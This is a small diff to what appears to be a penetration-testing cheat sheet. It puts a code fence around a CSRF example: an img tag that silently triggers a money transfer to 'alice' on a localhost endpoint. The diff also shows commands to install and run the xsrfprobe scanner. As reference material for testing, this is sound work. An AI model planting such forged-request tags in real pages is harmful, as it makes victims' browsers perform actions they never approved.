@@ -125,7 +125,9 @@ https://github.com/epinna/tplmap
 
 ### CSRF (Cross Site Request Forgery)
 
+```
 <img src="http://localhost:3000/transfer?to=alice&amount=100">
+```
 ```
 pip3 install xsrfprobe
 xsrfprobe -u <url>/<endpoint>
